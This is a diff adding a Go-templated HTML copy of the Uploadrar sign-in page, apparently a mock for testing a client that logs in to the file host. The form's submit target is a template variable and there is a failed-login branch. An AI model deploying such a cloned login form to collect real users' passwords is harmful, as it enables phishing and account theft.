@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Uploadrar - Sign in</title>
+</head>
+<body>
+<a class="btn" href="https://uploadrar.com/login.html">Sign in</a>
+{{if .Refused}}<div class="alert alert-danger">Incorrect Login or Password</div>
+{{end}}	<form method="POST" action="{{.Action}}" name="FL">
+		<input type="hidden" name="op" value="login">
+		<input type="hidden" name="token" value="579fb19833d7df1bb74d8f65080e00fd">
+		<input type="hidden" name="rand" value="">
+		<input type="hidden" name="redirect" value="">
+		<div class="login">
+			<div class="mb-4 pb-2 row align-items-center">
+				<div class="col-auto mb-2">
+					<h1 class="fs-3 text-dark mb-0">Sign in</h1>
+				</div>
+				<div class="col-auto mb-2">
+					<a class="small fw-500" href="https://uploadrar.com/register/">Sign up for a new account</a>
+				</div>
+			</div>
+			<input type="text" class="form-control" id="input_name" placeholder="" name="login" value="">
+			<input type="password" class="form-control" id="input_pass" placeholder="" name="password" value="">
+			<button type="submit" class="btn btn-primary">Sign in</button>
+		</div>
+	</form>
+<input type="button"  class="btn btn-primary" value="Agree" onclick="cookiesAgree()">
+</body>
+</html>
